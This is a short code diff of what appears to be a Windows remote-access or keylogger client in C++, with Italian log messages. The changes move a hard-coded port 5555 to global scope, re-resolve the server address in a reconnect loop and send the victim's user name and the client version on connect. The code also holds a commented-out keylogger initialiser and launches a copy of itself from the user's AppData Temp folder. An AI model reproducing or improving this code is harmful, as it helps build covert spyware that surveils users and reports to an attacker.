@@ -30,11 +30,12 @@ char mes[500]={0};
 char Csimb[3]={0};
 char Cbott[3]={0};
 char ctsk[7]={0};
-char ver[50]="1.1.4";
+char ver[30]="1.1.5";
 int simb=0;
 int bott=0;
 int LagCount=0;
 int data=0;
+int PORTA=5555;//RIF
 
 using namespace std;
 
@@ -81,7 +82,6 @@ int main()
 			return 0;
 	//InitKeylog();
 	DataInst();
-	int PORTA=5555;//RIF
 	int check=0;
 	if(initSock()!=-1)
 	{
@@ -166,10 +166,12 @@ addrinfo wcon(SOCKET s,addrinfo a)
 	while(true)
 	{
 		Sleep(1000);
+		a=getSinfo(s,PORTA);
 		if(connect(s,(sockaddr *)(a.ai_addr),sizeof(sockaddr_in)))
 		{
 			freeaddrinfo(a.ai_next);
 			cout<<"<Client> Errore: impossibile connettersi, riprovo..."<<endl;
+			//a=getSinfo(s,PORTA);
 		}
 		else
 		{
@@ -178,6 +180,7 @@ addrinfo wcon(SOCKET s,addrinfo a)
 			send(s,sig,30,0);
 			GetUserName(name,&cchCN);
 			send(s,name,30,0);
+			send(s,ver,30,0);
 			v5=true;
 			break;
 		}
@@ -778,17 +781,17 @@ void manda(SOCKET s)
 		if(v5)
 		if(recv(s,&c,1,MSG_PEEK)==-1)
 		{
-			v2=false;
-			v3=false;
-			v4=false;
-			v6=false;
-			v7=true;
-			v8=false;
+			cout<<"<Client> Connessione persa"<<endl;
+			v6=false; // LKL
+			v9=false; // MSTK
 			closesocket(Client);
 			Client=createSock();
 			Sleep(1000);
 			if(v!=-1)
+			{
 				Server=wcon(Client,Server);
+				s=Client;
+			}
 		}
 	}
 }
@@ -860,7 +863,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\a.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
